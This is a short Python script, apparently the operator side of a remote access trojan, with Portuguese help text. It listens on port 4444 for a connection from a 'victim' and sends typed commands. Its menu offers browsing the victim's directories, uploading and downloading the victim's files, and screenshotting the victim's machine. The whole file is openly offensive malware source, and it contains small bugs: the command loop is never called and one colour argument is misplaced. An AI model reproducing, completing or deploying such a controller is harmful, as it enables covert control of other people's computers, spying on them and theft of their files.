import socket
import termcolor
import json
from termcolor import colored


def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def t_comun():
    count = 0
    while True:
        comand = input("* Shell~%s: " % str(ip))
        data_send(comand)
        if comand == 'exit':
            break
        elif comand == "help":
            print(colored('''\n
            clear: Limpa o terminal
            exit: Fecha a conexão com a vitima
            cd + "NomeDoDiretorio": Troca o diretorio da vitima
            upload + "NomeDoArquivo": Envia arquivo para a  maquina da vitima
            download + "NomeDoArquivo":Baixa arquivos da vitima 
            print: Tira print da maquina da vitima                                                     
            help: Ajuda o usuario a uasr os comandos
            '''), "yellow")
            

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(("192.168.1.11", 4444))
print(colored('[] Esperando por conexões', "green" ))
socket.listen(5)

target, ip = socket.accept()
print(colored("+ Connectado com: " + str(ip), "green"))
